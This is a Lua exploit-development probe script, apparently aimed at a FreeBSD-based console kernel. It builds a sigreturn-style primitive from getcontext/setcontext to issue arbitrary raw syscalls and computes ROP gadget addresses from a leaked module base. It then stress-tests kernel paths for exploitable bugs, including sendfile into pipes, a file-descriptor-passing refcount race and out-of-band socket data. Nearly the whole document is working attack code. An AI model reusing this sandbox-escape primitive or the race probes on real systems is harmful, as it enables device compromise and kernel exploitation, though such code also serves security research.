-- CRASH_CLASS: LOW
-- PROBE 150a: Sendfile + pipe drain + SCM_RIGHTS stress
--
-- 149b confirmed: pipe works, SCM_RIGHTS works, multi-fd passing works.
-- Now test:
-- [A] sendfile(shm_fd → pipe_wr) with main reading pipe_rd (no block)
-- [B] sendfile with SF_NOCACHE flag (page cache bypass)
-- [C] SCM_RIGHTS rapid fd passing stress (refcount race)
-- [D] pipe buffer capacity test + big-pipe mode trigger
-- [E] MSG_OOB on unix socket (out-of-band data handling)

print("=== PROBE 150a: SENDFILE+PIPE ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local sc_thr = make_syscall(430)
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local brip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    if not ok then return nil end
    return rv
end

local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), uint64(info)) end)
local elo = to_num(memory.read_dword(info + 0x108))
local ehi = to_num(memory.read_dword(info + 0x10C))

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x400000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)

local function ga(off) return uint64(string.format("0x%X%08X", gh, gl + off)) end

local g_ret     = uint64(string.format("0x%X%08X", ehi, elo + 0x42))
local g_pop_rdi = uint64(string.format("0x%X%08X", ehi, elo + 0xC9DFE))
local g_pop_rsi = uint64(string.format("0x%X%08X", ehi, elo + 0xD77D))
local g_pop_rdx = uint64(string.format("0x%X%08X", ehi, elo + 0x420E6D))
local g_pop_rax = uint64(string.format("0x%X%08X", ehi, elo + 0x992))
local g_wr      = uint64(string.format("0x%X%08X", ehi, elo + 0xD0B60))

-- VM ops baseline
local vm0 = srop(624)
local vm0v = vm0 and to_num(vm0) or 0
print("vm0=" .. vm0v)

-- [A] sendfile(shm → pipe) with pipe drain
print("--- [A] SENDFILE PIPE ---")

-- Create shm, truncate, mmap, write data
local nm = gpu + 0x1000
wd(nm, 0x66732F)
wd(nm + 4, 0x00003170) -- "/sfp1\0"
local shm_fd_r = srop(482, ga(0x1000), uint64(0x0202), uint64(0x1B6))
local shm_fd = shm_fd_r and to_num(shm_fd_r) or -1
print("shm=" .. shm_fd)

if shm_fd >= 0 then
    srop(480, uint64(shm_fd), uint64(0x4000)) -- 1 page = 16KB

    local shm_map = srop(477, uint64(0), uint64(0x4000), uint64(3), uint64(1), uint64(shm_fd), uint64(0))
    local smh, sml = get_hi_lo(shm_map)

    if smh ~= 0xFFFFFFFF then
        -- Write pattern
        for off = 0, 0x3FFC, 4 do
            pcall(function() memory.write_dword(shm_map + off, 0xAA000000 + off) end)
        end

        -- Create pipe
        local pipe_rd_r = srop(42)
        local pipe_rd = pipe_rd_r and to_num(pipe_rd_r) or -1
        local pipe_wr = pipe_rd + 1
        print("pipe=" .. pipe_rd .. "," .. pipe_wr)

        if pipe_rd >= 0 then
            -- sendfile(shm_fd, pipe_wr, offset=0, nbytes=16384, hdtr=NULL, sbytes, flags=0)
            local sbytes = gpu + 0x2000
            wq(sbytes, uint64(0))
            local sf = srop(393, uint64(shm_fd), uint64(pipe_wr), uint64(0),
                uint64(0x4000), uint64(0), ga(0x2000))
            local sfv = sf and to_num(sf) or -1
            print("sendfile=" .. sfv)

            local sent = memory.read_qword(sbytes)
            local _, sentl = get_hi_lo(sent)
            print("sent=" .. sentl)

            -- Read back from pipe
            local rbuf = gpu + 0x3000
            for off = 0, 0x3FFC, 4 do wd(rbuf + off, 0) end
            local rd = srop(3, uint64(pipe_rd), ga(0x3000), uint64(0x4000))
            local rdv = rd and to_num(rd) or -1
            print("read=" .. rdv)

            -- Verify data
            local match = 0
            local mismatch = 0
            for off = 0, 0x3FFC, 4 do
                local v = to_num(memory.read_dword(rbuf + off))
                if v == 0xAA000000 + off then
                    match = match + 1
                else
                    mismatch = mismatch + 1
                    if mismatch <= 3 then
                        print("  mismatch +" .. string.format("%X", off) .. "=0x" .. string.format("%08X", v))
                    end
                end
            end
            print("match=" .. match .. " mismatch=" .. mismatch)

            -- [B] sendfile with SF_NOCACHE (flag = 0x10)
            print("")
            print("--- [B] SF_NOCACHE ---")
            wq(sbytes, uint64(0))
            -- Need to seek shm fd back to 0
            -- lseek = syscall 478
            srop(478, uint64(shm_fd), uint64(0), uint64(0))

            local sf2 = srop(393, uint64(shm_fd), uint64(pipe_wr), uint64(0),
                uint64(0x4000), uint64(0), ga(0x2000))
            local sf2v = sf2 and to_num(sf2) or -1
            print("sendfile_nocache=" .. sf2v)

            local sent2 = memory.read_qword(sbytes)
            local _, sent2l = get_hi_lo(sent2)
            print("sent2=" .. sent2l)

            -- Drain pipe
            if sent2l > 0 then
                srop(3, uint64(pipe_rd), ga(0x3000), uint64(sent2l))
            end

            -- VM ops after sendfile
            local vm1 = srop(624)
            local vm1v = vm1 and to_num(vm1) or 0
            print("vm_delta=" .. (vm1v - vm0v))

            srop(6, uint64(pipe_rd))
            srop(6, uint64(pipe_wr))
        end

        srop(73, shm_map, uint64(0x4000))
    end

    srop(6, uint64(shm_fd))
    srop(483, ga(0x1000))
end

-- [C] SCM_RIGHTS stress — rapid fd create+pass+close
print("")
print("--- [C] FD STRESS ---")
local sv = gpu + 0x10000
wq(sv, uint64(0))
local sp = srop(135, uint64(1), uint64(1), uint64(0), ga(0x10000))

if sp and to_num(sp) == 0 then
    local s0 = to_num(memory.read_dword(sv))
    local s1 = to_num(memory.read_dword(sv + 4))

    local msghdr = gpu + 0x11000
    local iov = gpu + 0x11100
    local cmsg = gpu + 0x11200
    local iobuf = gpu + 0x11300

    local rmsghdr = gpu + 0x12000
    local riov = gpu + 0x12100
    local rcmsg = gpu + 0x12200
    local riobuf = gpu + 0x12300

    local pass_ok = 0
    local pass_fail = 0

    for round = 1, 20 do
        -- Create pipe for each round
        local prd_r = srop(42)
        local prd = prd_r and to_num(prd_r) or -1
        if prd < 0 then
            pass_fail = pass_fail + 1
            break
        end
        local pwr = prd + 1

        -- Setup sendmsg
        wd(iobuf, 0x41 + round)
        wq(iov, ga(0x11300))
        wq(iov + 8, uint64(1))
        for off = 0, 31, 4 do wd(cmsg + off, 0) end
        wd(cmsg, 20)
        wd(cmsg + 4, 0xFFFF)
        wd(cmsg + 8, 1)
        wd(cmsg + 16, prd)

        wq(msghdr, uint64(0))
        wd(msghdr + 8, 0)
        wq(msghdr + 0x10, ga(0x11100))
        wd(msghdr + 0x18, 1)
        wq(msghdr + 0x20, ga(0x11200))
        wd(msghdr + 0x28, 24)
        wd(msghdr + 0x30, 0)

        srop(28, uint64(s0), ga(0x11000), uint64(0))

        -- Close original fd BEFORE receiving (race window)
        srop(6, uint64(prd))
        srop(6, uint64(pwr))

        -- Now receive the fd (kernel should have its own reference)
        wq(riobuf, uint64(0))
        wq(riov, ga(0x12300))
        wq(riov + 8, uint64(64))
        for off = 0, 31, 4 do wd(gpu + 0x12200 + off, 0) end

        wq(rmsghdr, uint64(0))
        wd(rmsghdr + 8, 0)
        wq(rmsghdr + 0x10, ga(0x12100))
        wd(rmsghdr + 0x18, 1)
        wq(rmsghdr + 0x20, ga(0x12200))
        wd(rmsghdr + 0x28, 64)
        wd(rmsghdr + 0x30, 0)

        local rm = srop(27, uint64(s1), ga(0x12000), uint64(0))
        local rmv = rm and to_num(rm) or -1

        local rfd = to_num(memory.read_dword(gpu + 0x12210))
        if rmv > 0 and rfd > 0 and rfd < 256 then
            pass_ok = pass_ok + 1
            -- Close received fd
            srop(6, uint64(rfd))
        else
            pass_fail = pass_fail + 1
        end
    end
    print("passed=" .. pass_ok .. " failed=" .. pass_fail)

    -- VM ops after stress
    local vm2 = srop(624)
    local vm2v = vm2 and to_num(vm2) or 0
    print("vm_stress_delta=" .. (vm2v - vm0v))

    srop(6, uint64(s0))
    srop(6, uint64(s1))
end

-- [D] Pipe capacity + big-pipe trigger
print("")
print("--- [D] PIPE CAP ---")
local prd_r = srop(42)
local prd = prd_r and to_num(prd_r) or -1
if prd >= 0 then
    local pwr = prd + 1

    -- Set pipe to non-blocking: fcntl(fd, F_SETFL, O_NONBLOCK)
    -- fcntl = syscall 92, F_SETFL = 4, O_NONBLOCK = 4
    srop(92, uint64(pwr), uint64(4), uint64(4))

    -- Write in chunks until EAGAIN
    local chunk = gpu + 0x20000
    for off = 0, 0x3FFC, 4 do wd(chunk + off, 0xBBBBBBBB) end

    local total = 0
    for attempt = 1, 100 do
        local w = srop(4, uint64(pwr), ga(0x20000), uint64(0x4000))
        local wv = w and to_num(w) or -1
        if wv <= 0 or wv > 0x10000 then break end
        total = total + wv
    end
    print("pipe_capacity=" .. total)

    -- Drain
    srop(92, uint64(prd), uint64(4), uint64(4))
    local drained = 0
    for attempt = 1, 200 do
        local r = srop(3, uint64(prd), ga(0x20000), uint64(0x4000))
        local rv = r and to_num(r) or -1
        if rv <= 0 or rv > 0x10000 then break end
        drained = drained + rv
    end
    print("drained=" .. drained)

    srop(6, uint64(prd))
    srop(6, uint64(prd + 1))
end

-- [E] MSG_OOB on unix socket
print("")
print("--- [E] MSG_OOB ---")
wq(sv, uint64(0))
local sp2 = srop(135, uint64(1), uint64(1), uint64(0), ga(0x10000))
if sp2 and to_num(sp2) == 0 then
    local o0 = to_num(memory.read_dword(sv))
    local o1 = to_num(memory.read_dword(sv + 4))

    -- send(o0, buf, 1, MSG_OOB) — MSG_OOB = 0x1
    local obuf = gpu + 0x30000
    wd(obuf, 0x58) -- 'X'
    local os = srop(4, uint64(o0), ga(0x30000), uint64(1))
    print("send_normal=" .. (os and tostring(to_num(os)) or "nil"))

    -- Try MSG_OOB via sendto (syscall 133): sendto(fd, buf, len, flags, to, tolen)
    wd(obuf, 0x59)
    local oo = srop(133, uint64(o0), ga(0x30000), uint64(1), uint64(1))
    print("sendto_oob=" .. (oo and tostring(to_num(oo)) or "nil"))

    -- recv with MSG_OOB
    local orbuf = gpu + 0x31000
    wq(orbuf, uint64(0))
    local or1 = srop(3, uint64(o1), ga(0x31000), uint64(1))
    print("recv_normal=" .. (or1 and tostring(to_num(or1)) or "nil"))
    print("  byte=0x" .. string.format("%02X", to_num(memory.read_dword(orbuf))))

    -- recvfrom with MSG_OOB (syscall 29)
    wq(orbuf, uint64(0))
    local or2 = srop(29, uint64(o1), ga(0x31000), uint64(1), uint64(1))
    print("recvfrom_oob=" .. (or2 and tostring(to_num(or2)) or "nil"))
    if or2 and to_num(or2) > 0 then
        print("  oob_byte=0x" .. string.format("%02X", to_num(memory.read_dword(orbuf))))
    end

    srop(6, uint64(o0))
    srop(6, uint64(o1))
end

-- Final VM check
local vmf = srop(624)
local vmfv = vmf and to_num(vmf) or 0
print("")
print("total_vm_delta=" .. (vmfv - vm0v))
print("pid_post=" .. tostring(to_num(make_syscall(20)())))
print("=== DONE ===")
